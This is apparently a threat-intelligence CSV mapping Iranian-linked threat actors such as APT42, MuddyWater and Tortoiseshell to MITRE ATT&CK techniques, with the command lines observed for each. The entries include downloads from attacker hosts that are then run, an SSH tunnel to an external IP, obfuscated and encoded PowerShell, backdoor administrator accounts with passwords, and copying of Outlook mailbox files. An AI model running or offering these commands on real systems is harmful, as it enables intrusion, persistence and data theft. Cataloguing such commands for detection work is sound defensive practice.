Threat Actor,Tool,Mitre Category,Mitre Technique ID,Mitre Technique Name,CLI
Parisite,findstr,discovery,T1049,System Network Connections Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,findstr,execution,T1059.001,PowerShell,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,findstr,discovery,T1016,System Network Configuration Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,findstr,lateral-movement,T1021.004,SSH,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,findstr,discovery,T1018,Remote System Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Netsh,command-and-control,T1090.001,Internal Proxy,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Netsh,discovery,T1049,System Network Connections Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Netsh,execution,T1059.001,PowerShell,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Netsh,discovery,T1016,System Network Configuration Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Netsh,lateral-movement,T1021.004,SSH,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Netsh,discovery,T1018,Remote System Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Cmd,command-and-control,T1090.001,Internal Proxy,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Cmd,discovery,T1049,System Network Connections Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Cmd,execution,T1059.001,PowerShell,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Cmd,discovery,T1016,System Network Configuration Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Cmd,lateral-movement,T1021.004,SSH,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,Cmd,discovery,T1018,Remote System Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
MuddyWater,Csc.exe,execution,T1059.001,PowerShell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
MuddyWater,Csc.exe,execution,T1059.003,Windows Command Shell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
MuddyWater,Reg,execution,T1059.001,PowerShell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
MuddyWater,Reg,execution,T1059.003,Windows Command Shell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
MuddyWater,PowerShell,execution,T1059.001,PowerShell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
MuddyWater,PowerShell,execution,T1059.003,Windows Command Shell,"%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w -l -file %ALLUSERSPROFILE%\a.ps1
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @%WINDIR%\TEMP\dlr5lzwp\dlr5lzwp.cmdline
%WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv
%WINDIR%\system32\reg.exe %WINDIR%\system32\reg.exe save HKLM\SYSTEM SystemBkup.hiv"
MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -WindowStyle Hidden
MuddyWater,PowerShell,defense-evasion,T1564.003,Hidden Window,powershell.exe -WindowStyle Hidden
MuddyWater,NetBird,persistence,T1133,External Remote Services,netbird.exe setup --setup-key E48E4A70-4CF4-4A77-946B-C8E50A60855A --management-url
MuddyWater,Schtasks.exe,execution,T1053.005,Scheduled Task,schtasks /create /tn ForceNetbirdRestart
MuddyWater,Windows Service Configuration Tool,persistence,T1133,External Remote Services,sc config netbird start= delayed-auto
MuddyWater,Windows Service Configuration Tool,persistence,T1543.003,Windows Service,sc config netbird start= delayed-auto
MuddyWater,NetBird,persistence,T1133,External Remote Services,sc config netbird start= delayed-auto
MuddyWater,NetBird,persistence,T1543.003,Windows Service,sc config netbird start= delayed-auto
MuddyWater,OpenSSH,persistence,T1543.003,Windows Service,sc config sshd start= auto
MuddyWater,Windows Service Configuration Tool,persistence,T1543.003,Windows Service,sc config sshd start= auto
MuddyWater,Net,persistence,T1136.001,Local Account,net user user Bs@202122 /add
MuddyWater,Net,persistence,T1098.007,Additional Local or Domain Groups,net localgroup Administrators user /add
MuddyWater,Net,persistence,T1098.007,Additional Local or Domain Groups,net localgroup Administrateurs user /add
MuddyWater,WMIC,execution,T1047,Windows Management Instrumentation,wmic useraccount where name='user' set passwordexpires=false
MuddyWater,WMIC,persistence,T1098,Account Manipulation,wmic useraccount where name='user' set passwordexpires=false
Cyber Av3ngers,curl,execution,T1059.004,Unix Shell,curl --http2 --header accept: application/dns-json https://1.1.1.1/dns-query?name=google.com
Cyber Av3ngers,whoami,discovery,T1082,System Information Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,whoami,discovery,T1033,System Owner/User Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,whoami,discovery,T1124,System Time Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,date,discovery,T1082,System Information Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,date,discovery,T1033,System Owner/User Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,date,discovery,T1124,System Time Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,hostname.exe,discovery,T1082,System Information Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,hostname.exe,discovery,T1033,System Owner/User Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,hostname.exe,discovery,T1124,System Time Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,uname,discovery,T1082,System Information Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,uname,discovery,T1033,System Owner/User Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
Cyber Av3ngers,uname,discovery,T1124,System Time Discovery,"uname -v > /tmp/{RANDOM_16_chars}.txt 2>&1
hostname > /tmp/{RANDOM_16_chars}.txt 2>&1
whoami   > /tmp/{RANDOM_16_chars}.txt 2>&1
date +%Z > /tmp/{RANDOM_16_chars}.txt 2>&1
uname -r > /tmp/{RANDOM_16_chars}.txt 2>&1"
MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -Command Copy-Item -Path %%malware path%% -Destination '%ALLUSERSPROFILE%\Logs' -Force
Tortoiseshell,Systeminfo,discovery,T1082,System Information Discovery,cmd.exe /C systeminfo | findstr /I Domain
Tortoiseshell,Cmd,discovery,T1082,System Information Discovery,cmd.exe /C systeminfo | findstr /I Domain
Tortoiseshell,findstr,discovery,T1082,System Information Discovery,cmd.exe /C systeminfo | findstr /I Domain
Tortoiseshell,rar.exe,defense-evasion,T1027,Obfuscated Files or Information,%PROGRAMFILES%\WinRAR\RAR.exe a -v1000m -m5 %PROGRAMFILES%\WinRAR\{COMPANY_NAME}.rar C:/Users/{USERNAME}/AppData/Local/Microsoft/Outlook/{TARGET_OST}
APT42,Rundll32,defense-evasion,T1218.011,Rundll32,rundll32.exe %WINDIR%\system32\davclnt.dll DavSetCookie datadrift.somee.com@SSL https://datadrift.somee.com/aoh5/[REDACTED].lnk
APT42,ren,command-and-control,T1105,Ingress Tool Transfer,cmd /c curl --ssl-no-revoke -o vgh.txt https://line.completely.workers.dev/aoh5 & rename vgh.txt temp.bat & %tmp%
APT42,Cmd,command-and-control,T1105,Ingress Tool Transfer,cmd /c curl --ssl-no-revoke -o vgh.txt https://line.completely.workers.dev/aoh5 & rename vgh.txt temp.bat & %tmp%
APT42,curl,command-and-control,T1105,Ingress Tool Transfer,cmd /c curl --ssl-no-revoke -o vgh.txt https://line.completely.workers.dev/aoh5 & rename vgh.txt temp.bat & %tmp%
APT42,Invoke-RestMethod,execution,T1059.001,PowerShell,powershell -w 1 $lb='gBjs';$uq=(invoke-restmethod -UserAgent 'Chrome' 'https://line.completely.workers.dev/aoh52');.(gcm i*ee*)$uq
APT42,PowerShell,execution,T1059.001,PowerShell,powershell -w 1 $lb='gBjs';$uq=(invoke-restmethod -UserAgent 'Chrome' 'https://line.completely.workers.dev/aoh52');.(gcm i*ee*)$uq
APT42,PowerShell,execution,T1059.001,PowerShell,powershell -w 1 $PbwpcDxXtAnaGrsu=(Get-Content -Path %LOCALAPPDATA%\Microsoft\Windows\AutoUpdate\fhgPczTORoCNEDsm.txt); &(gcm i*x)$PbwpcDxXtAnaGrsu
APT42,Console Windows Host,execution,T1059.003,Windows Command Shell,conhost --headless %PUBLIC%\Microsoft.bat
APT42,Microsoft Edge,execution,T1059.003,Windows Command Shell,msedge.exe --no-sandbox --remote-debugging-port=9222 --remote-allow-origins=ws://localhost:9222 --window-position=-32000-32000
APT42,PsSuspend,execution,T1059.003,Windows Command Shell,%LOCALAPPDATA%\Caches\pssuspend.exe -accepteula -nobanner <chrome_pid>
APT42,copy-item,execution,T1059.001,PowerShell,copy-item C:/Users/{USER}/AppData/Local/Microsoft/Outlook/@example.com.ost ` $env:APPDATA/victim@example.com.ost
APT42,Set-ItemProperty,execution,T1059.001,PowerShell,Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Renovation' -Value cmd /c \for %a in (\%localappdata%\Microsoft\Internet Explorer\List\*\) do ( start \\ \%a\ )\
APT42,curl,execution,T1059.003,Windows Command Shell,"curl.exe -X POST https://<FIREBASE-ENDPOINT>.json -H 
Content-Type: application/json -d {\LastUpdatTime\:{\.sv\:\timestamp\}} 
--ssl-no-revoke"
APT42,Microsoft Edge,execution,T1059.003,Windows Command Shell,start msedge \hxxps[://]1drv[.]ms/w/c/208F0gfdtrhkjB256/EXaIieylg5EtG6mcLAdhtdhgdytrfHM31tA?e=pjdsyyI\;
APT42,start,execution,T1059.003,Windows Command Shell,start msedge \hxxps[://]1drv[.]ms/w/c/208F0gfdtrhkjB256/EXaIieylg5EtG6mcLAdhtdhgdytrfHM31tA?e=pjdsyyI\;
APT42,ren,execution,T1059.003,Windows Command Shell,"%WINDIR%\System32\cmd.exe /c set hm=cmolbd /c colburl --ssolblno-revoolbke -o vgh.tolbxt
htolbtps[://]linolbe[.]complolbetely[.]workolbers[.]deolbv/aoh5 &
rename vgh.tolbxt temolbp.baolbt & %%tmolbp%%  & call %%hm:olb=%%"
APT42,Cmd,execution,T1059.003,Windows Command Shell,"%WINDIR%\System32\cmd.exe /c set hm=cmolbd /c colburl --ssolblno-revoolbke -o vgh.tolbxt
htolbtps[://]linolbe[.]complolbetely[.]workolbers[.]deolbv/aoh5 &
rename vgh.tolbxt temolbp.baolbt & %%tmolbp%%  & call %%hm:olb=%%"
APT42,Cmd,execution,T1059.003,Windows Command Shell,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d
id=CgYEFk&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST hxxps://prism-
west-candy[.]glitch[.]me/Down -o %temp%\\down.v7bs & call %c:7=% &
set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
APT42,PowerShell,execution,T1059.001,PowerShell,"powershell -w 1 $Pbwpc=(Get-Content -Path
'%LOCALAPPDATA%\Microsoft\Windows\AutoUpdate\fhgPczTORoCNEDsm.txt');
 &(gcm i*x) $Pbwpc"
APT42,PowerShell,execution,T1059.001,PowerShell,"powershell -w 1 $pnt=(Get-Content -Path
%APPDATA%\Microsoft\documentLoger.txt);
&(gcm i*x)$pnt"
Tortoiseshell,Net,execution,T1059.003,Windows Command Shell,net user DC-01$ P@ssw0rd
Tortoiseshell,ssh,command-and-control,T1572,Protocol Tunneling,%WINDIR%\system32\openssh\ssh.exe[Username]@[IP Address] -p 443 -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 1070
Tortoiseshell,Reg,defense-evasion,T1112,Modify Registry,reg delete HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default /va /f
Tortoiseshell,Reg,defense-evasion,T1112,Modify Registry,reg delete HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers /f
Tortoiseshell,SCCMVNC,execution,T1059.003,Windows Command Shell,SCCM.exe reconfig /target:[REDACTED]
Infy,Taskkill,defense-evasion,T1070.004,File Deletion,chcp 65001 TaskKill /F /IM 5268 Timeout /T 2 /Nobreak Del /ah
Infy,Taskkill,execution,T1059,Command and Scripting Interpreter,chcp 65001 TaskKill /F /IM 5268 Timeout /T 2 /Nobreak Del /ah
Infy,Taskkill,defense-evasion,T1070.004,File Deletion,chcp 65001 TaskKill /F /IM 8020 Timeout /T 2 /Nobreak Del /ah
Infy,Taskkill,execution,T1059,Command and Scripting Interpreter,chcp 65001 TaskKill /F /IM 8020 Timeout /T 2 /Nobreak Del /ah
MuddyWater,WinWord.exe,execution,T1059.003,Windows Command Shell,"%PROGRAMFILES%\Microsoft Office\Office16\WINWORD.EXE /n
%WINDIR%\System32\cmd.exe /c %ALLUSERSPROFILE%\CertificationKit.ini"
MuddyWater,Cmd,execution,T1059.003,Windows Command Shell,"%PROGRAMFILES%\Microsoft Office\Office16\WINWORD.EXE /n
%WINDIR%\System32\cmd.exe /c %ALLUSERSPROFILE%\CertificationKit.ini"
MuddyWater,Schtasks.exe,execution,T1059.003,Windows Command Shell,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
MuddyWater,Schtasks.exe,command-and-control,T1105,Ingress Tool Transfer,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
MuddyWater,Schtasks.exe,execution,T1053.005,Scheduled Task,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
MuddyWater,Cmd,execution,T1059.003,Windows Command Shell,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
MuddyWater,Cmd,command-and-control,T1105,Ingress Tool Transfer,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
MuddyWater,Cmd,execution,T1053.005,Scheduled Task,schtasks /create /sc daily /st 09:00 /tn DailyUpdate /tr %PUBLIC%\Downloads\novaservice.exe
MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand dgBhAGMAcgBvAHMAeQBzAGkAOwAkAHYAYQBjAHIAbwBzAHkAcwBpAD0AIgB2AGEAYwByAG8AcwB5AHMAaQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAEYATQBBAFAAUAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
